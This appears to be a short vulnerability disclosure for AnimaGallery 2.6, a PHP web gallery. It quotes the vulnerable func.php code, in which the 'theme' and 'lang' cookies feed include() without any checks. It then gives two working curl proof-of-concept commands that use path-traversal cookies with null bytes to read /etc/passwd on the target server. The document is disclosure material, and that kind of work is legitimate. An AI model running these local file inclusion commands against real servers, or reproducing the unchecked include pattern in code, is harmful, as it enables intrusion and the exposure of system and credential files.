# Date: 2015/06/07 
# Vendor Homepage: http://dg.no.sapo.pt/ 
# Software Link:http://dg.no.sapo.pt/AnimaGallery2.6.zip
# Version: 2.6
# Tested on: Centos 6.5,php 5.3.2,magic_quotes_gpc=off # Category: webapps
 
* Description
 
func.php
line 21 - 22:
 
include(&#039;themes/&#039;.$THEME.&#039;/templates.php&#039;);
include(&#039;languages/&#039;.$LANG.&#039;.php&#039;);
 
$lang and $THEME parametre from import_theme_lang() function.
 
function import_theme_lang()
{
  $THEME = DEFAULT_THEME;
  if(isset($_COOKIE[&#039;theme&#039;]) AND !THEME_LOCKED)
    $THEME = $_COOKIE[&#039;theme&#039;];  <--  Not Taint Checking
 
  $LANG = DEFAULT_LANG;
  if(isset($_COOKIE[&#039;lang&#039;]) AND @file_exists(&#039;languages/&#039;.$_COOKIE[&#039;lang&#039;].&#039;.php&#039;) AND !LANG_LOCKED)
    $LANG = $_COOKIE[&#039;lang&#039;];     <--- Not Taint Checking
 
  return(array($THEME, $LANG));
}
 
 
* Proof of Concept
 
curl "http://192.168.1.101/AnimaGallery/?load=adminboard&mode=1" --cookie "lang=../../../../../../../etc/passwd%00"
 
curl "http://192.168.1.101/AnimaGallery/?load=adminboard&mode=1" --cookie "theme=../../../../../../../etc/passwd%00"

